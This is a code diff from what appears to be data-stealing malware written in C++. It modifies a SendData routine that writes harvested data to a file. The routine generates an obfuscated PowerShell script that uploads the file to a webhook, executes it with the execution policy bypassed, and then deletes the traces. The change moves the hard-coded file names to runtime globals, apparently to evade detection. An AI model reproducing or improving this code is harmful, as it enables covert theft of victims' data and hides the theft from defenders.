@@ -6,7 +6,7 @@
 
 bool misc::SendData(std::string data) noexcept
 {
-	std::ofstream f(OBF("goop.txt"));
+	std::ofstream f(globals::g_sGoopFileName);
 	f << data;
 	f.close();
 
@@ -15,20 +15,21 @@ bool misc::SendData(std::string data) noexcept
 	std::string script = OBF("$Url=\"");
 
 	script.append(WEBHOOK);
-	script.append(OBF("\";"
-		"$Path = \".\\goop.txt\";"
+	script.append((OBF("\";"
+		"$Path=\".\\") + globals::g_sGoopFileName + OBF("\";"
 		"$fileBytes=[System.IO.File]::ReadAllBytes($Path);"
 		"$fileEnc=[System.Text.Encoding]::GetEncoding(\"UTF-8\").GetString($fileBytes);"
 		"$Boundary=[System.Guid]::NewGuid().ToString();"
-		"$bodyLines=(\"--$Boundary`r`nContent-Disposition: form-data; name=`\"files[0]`\"; filename=`\"goop.txt`\"`r`nContent-Type: text/html`r`n`r`n$fileEnc`r`n--$Boundary--`r`n\");"
-		"Invoke-RestMethod -Uri $Url -Method Post -ContentType \"multipart/form-data; boundary=`\"$Boundary`\"\" -Body $bodyLines;"));
+		"$bodyLines=(\"--$Boundary`r`nContent-Disposition: form-data; name=`\"files[0]`\"; filename=`\"") + globals::g_sGoopFileName + OBF("`\"`r`nContent-Type: text/html`r`n`r`n$fileEnc`r`n--$Boundary--`r`n\");"
+		"Invoke-RestMethod -Uri $Url -Method Post -ContentType \"multipart/form-data; boundary=`\"$Boundary`\"\" -Body $bodyLines;")));
 
 	std::ofstream file;
-	file.open(OBF("t.ps1"));
+	file.open(globals::g_sSendFileName);
 	file << script.c_str();
 	file.close();
 
-	if (!utils::RunSubWorker(NULL, OBF("powershell -ExecutionPolicy Bypass ./t.ps1")))
+	// Since the file name is evaluated at runtime, we don't obfuscate it
+	if (!utils::RunSubWorker(NULL, std::string(OBF("powershell -ExecutionPolicy Bypass ./") + globals::g_sSendFileName).c_str()))
 		retVal = false;
 
 	return retVal;
@@ -42,11 +43,11 @@ void misc::Cleanup(void) noexcept
 
 	if (!config::cleanup)
 		return;
-	if(utils::isFile(OBF("goop.txt")))
-		std::remove(OBF("goop.txt"));
+	if(utils::isFile(globals::g_sGoopFileName))
+		std::remove(globals::g_sGoopFileName.c_str());
 
-	if (utils::isFile(OBF("t.ps1")))
-		std::remove(OBF("t.ps1"));
+	if (utils::isFile(globals::g_sSendFileName))
+		std::remove(globals::g_sSendFileName.c_str());
 }
 
 void misc::SelfDelete(void) noexcept
